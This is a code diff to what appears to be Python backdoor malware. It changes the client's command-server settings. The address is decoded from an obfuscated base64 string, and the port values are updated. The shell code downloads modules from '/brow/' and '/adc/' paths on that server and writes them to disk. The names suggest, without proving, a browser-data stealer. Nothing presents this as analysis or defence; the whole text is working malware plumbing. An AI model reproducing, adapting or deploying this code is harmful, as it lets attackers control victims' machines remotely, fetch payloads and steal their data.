@@ -190,7 +190,7 @@ class Shell(object):
             if not os.path.exists(A.par_dir):os.makedirs(A.par_dir)
         except:pass
 
-        host2 = f"http://{HOST}:{PORT}"
+        host2 = f"http://{HOST0}:{PORT}"
         try:
             myfile = requests.get(host2+"/brow/"+sType, allow_redirects=_T)
             with open(p,'wb') as f:f.write(myfile.content)
@@ -395,7 +395,7 @@ class Shell(object):
             if not os.path.exists(A.par_dir):os.makedirs(A.par_dir)
         except:pass
 
-        host2 = f"http://{HOST}:{PORT}"
+        host2 = f"http://{HOST0}:{PORT}"
         try:
             myfile = requests.get(host2+"/adc/"+sType, allow_redirects=_T)
             with open(p,'wb') as f:f.write(myfile.content)
@@ -413,7 +413,8 @@ class Shell(object):
         p={_A:D,_O:o};A.send(code=7,args=p)
 
 HOST0 = base64.b64decode(host[10:] + host[:10]).decode()
-PORT0 = 1245
+PORT0 = 63214
+PORT = 3000
 
 class Client():
     def __init__(A):A.server_ip = HOST0;A.server_port = PORT0;A.is_active = _F;A.is_alive = _T;A.timeout_count = 0;A.shell = _N
